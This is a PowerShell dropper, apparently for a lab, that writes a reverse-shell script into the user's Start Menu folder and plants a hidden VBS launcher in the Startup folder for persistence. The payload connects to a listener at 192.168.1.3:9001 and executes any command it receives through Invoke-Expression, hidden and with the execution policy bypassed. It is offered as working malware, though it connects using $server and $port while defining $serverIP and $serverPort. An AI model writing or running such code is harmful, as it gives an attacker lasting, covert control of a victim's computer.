# Paths
$programsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs"
$startupPath  = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$ps1Path = Join-Path $programsPath "code2.ps1"
$ps1Content = @'
$serverIP = '192.168.1.3'  # Lab listener IP
$serverPort = 9001           # Lab listener port

try {
    $client = New-Object System.Net.Sockets.TCPClient($server, $port)
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true

    while ($client.Connected) {
        $data = New-Object byte[] 1024
        $bytes = $stream.Read($data, 0, $data.Length)
        if ($bytes -gt 0) {
            $command = (New-Object System.Text.ASCIIEncoding).GetString($data, 0, $bytes)
            $output = Invoke-Expression $command 2>&1 | Out-String
            $writer.WriteLine($output)
        }
    }
} catch {
    
}

'@

Set-Content -Path $ps1Path -Value $ps1Content -Force
$vbsPath = Join-Path $startupPath "RunHidden.vbs"

$vbsContent = @'
Dim objShell
Set objShell = CreateObject("Wscript.Shell")

' Path to your PowerShell script
psScript = "C:\Users\PRINCI\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\code2.ps1"

' Command to run PowerShell hidden
cmd = "powershell.exe -ExecutionPolicy Bypass -File """ & psScript & """"

' 0 = hidden, False = don't wait
objShell.Run cmd, 0, False
'@

Set-Content -Path $vbsPath -Value $vbsContent -Force
$cscript = "cscript.exe //nologo `"$vbsPath`""
Start-Process -FilePath "cscript.exe" -ArgumentList "//nologo", "`"$vbsPath`"" -WindowStyle Hidden
